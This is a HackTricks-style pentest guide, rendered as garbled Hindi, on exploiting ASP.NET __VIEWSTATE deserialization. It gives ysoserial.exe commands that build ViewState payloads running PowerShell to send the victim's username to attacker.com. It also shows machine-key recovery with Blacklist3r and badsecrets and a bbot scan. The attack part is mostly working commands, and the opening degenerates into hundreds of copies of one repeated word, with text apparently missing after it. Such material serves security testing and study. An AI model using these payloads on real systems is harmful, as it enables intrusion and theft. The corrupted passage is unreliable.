# рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдирд╣реАрдВ рдЬрд╛рдирддреЗ рд╣реБрдП \_\_VIEWSTATE рдХрд╛ рд╢реЛрд╖рдг

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рдЬреЛ рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА рддрдХрдиреАрдХреА
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рдкрд╣рдЪрд╛рдирдирд╛**

рдЖрдк ViewState рдХреЛ MAC рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрдиреЗ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП BurpSuite рдХреЗ рд╕рд╛рде рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╢рд╛рдорд┐рд▓ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдХреЗ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ Mac рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдк [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рдЙрддреНрдкреАрдбрд╝рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛ 1.5 тАУ рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛ 1 рдХреА рддрд░рд╣, ViewState рдХреБрдХреА рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд╣реАрдВ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ

рдбреЗрд╡рд▓рдкрд░ ViewState рдХреЛ HTTP рдЕрдиреБрд░реЛрдз рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд╣реАрдВ рдмрдирдиреЗ рджреЗ рд╕рдХрддреЗ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдпрд╣ рдХреБрдХреА рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧреА)ред\
рдХреЛрдИ рдпрд╣ рдорд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрджрд┐ ViewState рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рддреЛ рдЙрдирдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди ViewState рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рд╕рдВрднрд╛рд╡рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдРрд╕рд╛ рдирд╣реАрдВ рд╣реИред рдпрджрд┐ рд╣рдо рдЕрдиреБрд░реЛрдз рд╢рд░реАрд░ рдореЗрдВ ViewState рдкреИрд░рд╛рдореАрдЯрд░ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдФрд░ ysoserial рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмрдирд╛рдП рдЧрдП рд╣рдорд╛рд░реЗ рд╕реАрд░реАрдпрд▓рд╛рдЗрдЬрд╝ рдХрд┐рдП рдЧрдП рдкреЗрд▓реЛрдб рдХреЛ рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рдлрд┐рд░ рднреА рдХреЛрдб рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХреЗрдВрдЧреЗ рдЬреИрд╕рд╛ рдХрд┐ рдорд╛рдорд▓рд╛ 1 рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред

### рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛: 2 тАУ .Net < 4.5 рдФрд░ EnableViewStateMac=true & ViewStateEncryptionMode=false

**рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреГрд╖реНрда** рдХреЗ рд▓рд┐рдП **ViewState MAC рд╕рдХреНрд╖рдо** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ aspx рдлрд╝рд╛рдЗрд▓ рдкрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
рд╣рдо рдЗрд╕реЗ **рд╕рдордЧреНрд░** рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ **web.config** рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
рдЬреИрд╕рд╛ рдХрд┐ рдкреИрд░рд╛рдореАрдЯрд░ MAC рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рдЗрд╕ рдмрд╛рд░ рд╣рдореЗрдВ рд╣рдорд▓рд╛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдХреБрдВрдЬреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рдЖрдк [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдВрдЬреА рдХреЛ рдЦреЛрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) рдПрдХ рдФрдЬрд╛рд░ рд╣реИ рдЬреЛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ machineKeys рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ Python рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП Blacklist3r рдХреА рддрд░рд╣ рдпрд╣ Windows dependency рдирд╣реАрдВ рд╣реИред .NET viewstates рдХреЗ рд▓рд┐рдП, рдПрдХ "python blacklist3r" рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рддреЗрдЬ рддрд░реАрдХрд╛ рд╣реИред

рдЗрд╕реЗ рдпрд╛ рддреЛ viewstate рдФрд░ generator рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

рдпрд╛, рдпрд╣ рд╕реАрдзреЗ рд▓рдХреНрд╖рд┐рдд URL рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ HTML рд╕реЗ viewstate рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

рд╡реНрдпреВрд╕реНрдЯреЗрдЯ рдкрд░рдореАрдЯрд░ рдХреЗ рд╡рдВрд╢рд╛рдВрдХрди рдХреЗ рд╕рд╛рде рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `badsecrets` [**BBOT**](exploiting-\_\_viewstate-parameter.md) рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

рдЕрдЧрд░ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рдФрд░ рдХреБрдВрдЬреА рдорд┐рд▓ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЖрдк [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
